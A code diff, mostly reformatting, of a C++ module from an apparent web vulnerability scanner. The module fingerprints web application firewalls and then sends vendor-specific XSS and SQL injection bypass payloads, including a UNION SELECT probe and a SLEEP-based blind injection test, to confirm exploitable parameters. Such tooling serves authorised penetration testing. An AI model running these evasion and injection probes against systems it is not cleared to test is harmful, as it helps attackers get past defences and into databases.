@@ -2,9 +2,10 @@
 /// @brief WAF Detection and Evasion Engine: fingerprints the WAF vendor,
 ///        then applies vendor-specific bypass techniques to all injection payloads.
 ///        Turns blocked findings into confirmed exploits.
-#include "scanner_base.hpp"
-#include <regex>
 #include <map>
+#include <regex>
+
+#include "scanner_base.hpp"
 
 namespace apex {
 namespace {
@@ -35,14 +36,14 @@ const std::vector<WAFSignature> WAF_SIGS = {
 };
 
 /// Detect which WAF is in front of the target.
-std::string detect_waf(HttpClient &http, const std::string &base) {
+std::string detect_waf(HttpClient& http, const std::string& base) {
   // Send a clearly malicious request to trigger WAF
   auto resp = http.get(base + "/?id=1'+OR+1=1--+UNION+SELECT+*+FROM+users");
 
   // Check signatures
-  for (const auto &sig : WAF_SIGS) {
+  for (const auto& sig : WAF_SIGS) {
     if (!sig.header_key.empty()) {
-      for (const auto &[key, val] : resp.headers) {
+      for (const auto& [key, val] : resp.headers) {
         std::string lower_key = key;
         std::transform(lower_key.begin(), lower_key.end(), lower_key.begin(), ::tolower);
         if (lower_key == sig.header_key) {
@@ -66,7 +67,7 @@ std::string detect_waf(HttpClient &http, const std::string &base) {
 }
 
 /// WAF-specific XSS bypass payloads.
-std::vector<std::string> get_xss_bypasses(const std::string &waf) {
+std::vector<std::string> get_xss_bypasses(const std::string& waf) {
   std::vector<std::string> payloads;
 
   // Universal bypasses
@@ -101,7 +102,7 @@ std::vector<std::string> get_xss_bypasses(const std::string &waf) {
 }
 
 /// WAF-specific SQLi bypass payloads.
-std::vector<std::string> get_sqli_bypasses(const std::string &waf) {
+std::vector<std::string> get_sqli_bypasses(const std::string& waf) {
   std::vector<std::string> payloads;
 
   // Universal
@@ -133,8 +134,7 @@ std::vector<std::string> get_sqli_bypasses(const std::string &waf) {
 }
 
 /// WAF detection and reporting.
-std::vector<Finding> scan_waf_detect(const Config &, HttpClient &http,
-                                      const CrawlResult &crawl) {
+std::vector<Finding> scan_waf_detect(const Config&, HttpClient& http, const CrawlResult& crawl) {
   std::vector<Finding> findings;
   if (crawl.urls.empty()) return findings;
   std::string base = base_url_from(crawl.urls[0]);
@@ -142,21 +142,21 @@ std::vector<Finding> scan_waf_detect(const Config &, HttpClient &http,
   std::string waf = detect_waf(http, base);
   if (waf.empty()) {
     findings.push_back(Finding{"No WAF Detected", "info", base,
-                        "No Web Application Firewall detected. "
-                        "Injection payloads can be sent without evasion.",
-                        "", "", ""});
+                               "No Web Application Firewall detected. "
+                               "Injection payloads can be sent without evasion.",
+                               "", "", ""});
   } else {
     findings.push_back(Finding{"WAF Detected — " + waf, "info", base,
-                        "Web Application Firewall identified: " + waf + ". "
-                        "Applying vendor-specific evasion techniques.",
-                        "waf", waf, ""});
+                               "Web Application Firewall identified: " + waf +
+                                   ". "
+                                   "Applying vendor-specific evasion techniques.",
+                               "waf", waf, ""});
   }
   return findings;
 }
 
 /// Attempt WAF bypass on XSS-vulnerable parameters.
-std::vector<Finding> scan_waf_xss_bypass(const Config &, HttpClient &http,
-                                          const CrawlResult &crawl) {
+std::vector<Finding> scan_waf_xss_bypass(const Config&, HttpClient& http, const CrawlResult& crawl) {
   std::vector<Finding> findings;
   if (crawl.urls.empty()) return findings;
   std::string base = base_url_from(crawl.urls[0]);
@@ -165,7 +165,7 @@ std::vector<Finding> scan_waf_xss_bypass(const Config &, HttpClient &http,
   auto payloads = get_xss_bypasses(waf);
 
   // Find reflective params
-  for (const auto &url : crawl.urls) {
+  for (const auto& url : crawl.urls) {
     auto qpos = url.find('?');
     if (qpos == std::string::npos) continue;
 
@@ -184,21 +184,18 @@ std::vector<Finding> scan_waf_xss_bypass(const Config &, HttpClient &http,
       if (check.body.find(canary) == std::string::npos) continue;
 
       // Param reflects — try bypass payloads
-      for (const auto &payload : payloads) {
+      for (const auto& payload : payloads) {
         auto resp = http.get(inject_url + payload);
         if (resp.status_code == 200 && resp.body.find(payload) != std::string::npos) {
           std::string severity = waf.empty() ? "high" : "critical";
-          findings.push_back(Finding{
-              waf.empty() ? "XSS Confirmed" : "XSS — WAF Bypass (" + waf + ")",
-              severity, inject_url + payload,
-              "Cross-site scripting confirmed" +
-              (waf.empty() ? "." : " WITH WAF BYPASS (" + waf + ").") +
-              " Payload: " + payload,
-              param, payload, ""});
+          findings.push_back(
+              Finding{waf.empty() ? "XSS Confirmed" : "XSS — WAF Bypass (" + waf + ")", severity, inject_url + payload,
+                      "Cross-site scripting confirmed" + (waf.empty() ? "." : " WITH WAF BYPASS (" + waf + ").") + " Payload: " + payload,
+                      param, payload, ""});
           return findings;
         }
       }
-      return findings; // Tested one reflecting param
+      return findings;  // Tested one reflecting param
     }
     break;
   }
@@ -206,8 +203,7 @@ std::vector<Finding> scan_waf_xss_bypass(const Config &, HttpClient &http,
 }
 
 /// Attempt WAF bypass on SQLi-vulnerable parameters.
-std::vector<Finding> scan_waf_sqli_bypass(const Config &, HttpClient &http,
-                                           const CrawlResult &crawl) {
+std::vector<Finding> scan_waf_sqli_bypass(const Config&, HttpClient& http, const CrawlResult& crawl) {
   std::vector<Finding> findings;
   if (crawl.urls.empty()) return findings;
   std::string base = base_url_from(crawl.urls[0]);
@@ -215,7 +211,7 @@ std::vector<Finding> scan_waf_sqli_bypass(const Config &, HttpClient &http,
   std::string waf = detect_waf(http, base);
   auto payloads = get_sqli_bypasses(waf);
 
-  for (const auto &url : crawl.urls) {
+  for (const auto& url : crawl.urls) {
     auto qpos = url.find('?');
     if (qpos == std::string::npos) continue;
 
@@ -232,26 +228,20 @@ std::vector<Finding> scan_waf_sqli_bypass(const Config &, HttpClient &http,
       // Baseline
       auto baseline = http.get(inject_url + orig_val);
 
-      for (const auto &payload : payloads) {
+      for (const auto& payload : payloads) {
         auto resp = http.get(inject_url + orig_val + payload);
         // SQLi indicators
-        if (resp.status_code == 200 && resp.body != baseline.body &&
-            resp.body.size() > baseline.body.size() &&
-            (resp.body.find("SQL") == std::string::npos ||
-             resp.body.find("mysql") != std::string::npos ||
+        if (resp.status_code == 200 && resp.body != baseline.body && resp.body.size() > baseline.body.size() &&
+            (resp.body.find("SQL") == std::string::npos || resp.body.find("mysql") != std::string::npos ||
              resp.body.find("syntax") != std::string::npos)) {
           // Error-based or content difference = likely SQLi
-          if (resp.body.find("mysql") != std::string::npos ||
-              resp.body.find("syntax") != std::string::npos ||
-              resp.body.find("SQLSTATE") != std::string::npos ||
-              resp.body.find("ORA-") != std::string::npos) {
-            findings.push_back(Finding{
-                waf.empty() ? "SQL Injection — Error Based" : "SQL Injection — WAF Bypass (" + waf + ")",
-                "critical", inject_url + orig_val + payload,
-                "SQL injection confirmed" +
-                (waf.empty() ? "." : " WITH WAF EVASION (" + waf + ").") +
-                " Database error triggered.",
-                param, payload, resp.body.substr(0, 200)});
+          if (resp.body.find("mysql") != std::string::npos || resp.body.find("syntax") != std::string::npos ||
+              resp.body.find("SQLSTATE") != std::string::npos || resp.body.find("ORA-") != std::string::npos) {
+            findings.push_back(
+                Finding{waf.empty() ? "SQL Injection — Error Based" : "SQL Injection — WAF Bypass (" + waf + ")", "critical",
+                        inject_url + orig_val + payload,
+                        "SQL injection confirmed" + (waf.empty() ? "." : " WITH WAF EVASION (" + waf + ").") + " Database error triggered.",
+                        param, payload, resp.body.substr(0, 200)});
             return findings;
           }
         }
@@ -260,15 +250,11 @@ std::vector<Finding> scan_waf_sqli_bypass(const Config &, HttpClient &http,
         std::string time_payload = orig_val + "' AND SLEEP(5)--";
         auto t_start = std::chrono::steady_clock::now();
         http.get(inject_url + time_payload);
-        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
-                           std::chrono::steady_clock::now() - t_start).count();
+        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - t_start).count();
         if (elapsed > 4500) {
           findings.push_back(Finding{
-              "SQL Injection — Time-Based Blind" + (waf.empty() ? "" : " (WAF: " + waf + ")"),
-              "critical", inject_url + time_payload,
-              "Blind SQL injection confirmed via SLEEP(5). Response delayed " +
-              std::to_string(elapsed) + "ms.",
-              param, time_payload, ""});
+              "SQL Injection — Time-Based Blind" + (waf.empty() ? "" : " (WAF: " + waf + ")"), "critical", inject_url + time_payload,
+              "Blind SQL injection confirmed via SLEEP(5). Response delayed " + std::to_string(elapsed) + "ms.", param, time_payload, ""});
           return findings;
         }
       }
@@ -279,7 +265,7 @@ std::vector<Finding> scan_waf_sqli_bypass(const Config &, HttpClient &http,
   return findings;
 }
 
-} // namespace
+}  // namespace
 
 std::vector<Scanner> register_waf_evasion_scanners() {
   return {
@@ -289,4 +275,4 @@ std::vector<Scanner> register_waf_evasion_scanners() {
   };
 }
 
-} // namespace apex
+}  // namespace apex
